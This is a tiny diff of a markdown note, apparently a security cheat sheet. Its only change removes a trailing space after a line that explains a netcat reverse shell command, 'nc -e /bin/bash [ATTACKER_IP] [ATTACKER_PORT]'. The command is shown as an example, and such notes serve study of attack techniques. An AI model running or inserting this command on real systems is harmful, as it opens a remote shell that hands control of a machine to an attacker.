@@ -26,7 +26,7 @@ tags:
 
  > 
  > **<font color=red>nc -e /bin/bash</font> \[ATTACKER_IP\] \[ATTACKER_PORT\]**<br>
- > Reverse shell. 
+ > Reverse shell.
 
 ---
 
